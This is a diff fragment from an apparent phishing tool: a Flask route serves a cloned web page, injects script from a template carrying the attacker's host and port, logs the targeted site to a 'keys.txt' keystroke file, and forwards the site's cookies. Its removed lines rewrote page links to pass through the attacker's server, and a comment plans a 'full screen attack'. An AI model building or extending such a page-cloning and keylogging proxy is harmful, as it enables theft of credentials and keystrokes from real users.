@@ -170,41 +170,20 @@ def link():
 	links = jsadd_soup.find_all("a")
 	print(links)
 
-	#Maybe we can do everything in one forloop, but i don't know if that will be very readable.
-	for link in links:
-		original_link = str(link)
-		try:
-			if link['href'][0] == "/":
-				original_goto = base_url + link['href']
-
-			#else:
-				#if url
-
-
-			link['href'] = f"http://{ipb}:{portb}/link?url={original_goto}"
-		except Exception as e:
-			print(e)
-			
-
-		#When we have the full screen attack, we need to manage a way to create a new fake tab when a _blank <a> tag is clicked, this can probably done with javascript.
-		if "target" in link:
-			if link['target'] == '_blank':
-				del link['target']
-
-		jsadd = str(jsadd_soup).replace(original_link, str(link))
-
-
 	#add the url to our keysfile so we know what site its for
 	with open("keys.txt","a") as keyfile:
 		keyfile.write(url+"\n")
 	keyfile.close()
 
 	#Make response with cookies and modified document.
+	with open("linkrepl.html","r") as f:
+		repl=f.read()
+	repl=repl.replace("#h#",ipb).replace("#p#",str(portb)).replace("#url#","\""+url+"\"")
+	jsadd+=repl
 	response = make_response(jsadd)
 	for cookie in r.cookies:
 		response.set_cookie(cookie.name, cookie.value, httponly=True)
-
-
+	
 	#serve the cloned page
 	return response
 
